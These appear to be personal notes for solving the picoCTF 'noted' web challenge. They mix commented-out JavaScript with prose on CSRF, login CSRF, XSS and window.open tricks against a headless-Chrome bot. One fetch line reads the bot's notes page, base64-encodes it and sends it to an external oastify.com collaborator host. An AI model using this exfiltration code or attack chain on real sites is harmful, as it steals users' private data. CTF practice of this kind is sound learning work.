// credentials-set routes have CORs disabled with credentials, we we're not able to 
// access /notes, /new, etc, but can create a new acc.
// that's why this works:
/*const url = 'http://0.0.0.0:8080/register';
const params = new URLSearchParams();
params.append('username', '0');
params.append('password', '0');

fetch(url, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: params.toString()
})
.then(response => response.text())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
*/


// but this does NOT:

/*
// 1) parse the user's notes at /notes and grab the flag
fetch('http://0.0.0.0:8080/notes')
    .then(response => response.text())
    .then(text => {let flag = text.split('<p>')[1].split("</")[0]; console.log(flag);});


fetch('http://saturn.picoctf.net:56976/notes').then(response => response.text()).then(text => {const encodedData = btoa(text).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');return fetch(`http://l1nxnllgo42ipvxd3xsagfdqrhx8l19q.oastify.com/?data=${encodedData}`);}).then(response => response.text()).then(result => console.log(result));

*/




This explains why CSRF are on all endpoints EXCEPT login/register. Moreover, it also explains why 
sandboxxing and windows sandboxxing is disabled. 
    * not true, as long as the windows are within the same origin the window.open 
    will Work.
    * One of the hints was that  "Things that require user interaction normally in Chrome might not require it in Headless Chrome."
    in XSS doing window.open will ask for permission or it may be blocked, but not in headless Model,
    So this hint is actually pretty useful.
    * CSRF cannot be stolen with JS because we need to login (submit form) and our JS does not persist after.
        This is because any "credentials-include" have CORs disabled. That is why internet connection
        on bot.js is a MUST.

They want us to create a new window and go to /notes (bot's acc), and then 
    submit a form to login to our account which will run XSS that parses the flag from the 
    now-expired session window FlagWindow. 
    ***** This is why there was NO CSRF on login page or register but everywhere else.

    https://crypto-cat.gitbook.io/ctf-writeups/2022/pico_22/web/noted
    We can use javascript:
    or data/Text, something to do the same

The report bot does indeed have internet Connection, which is weird.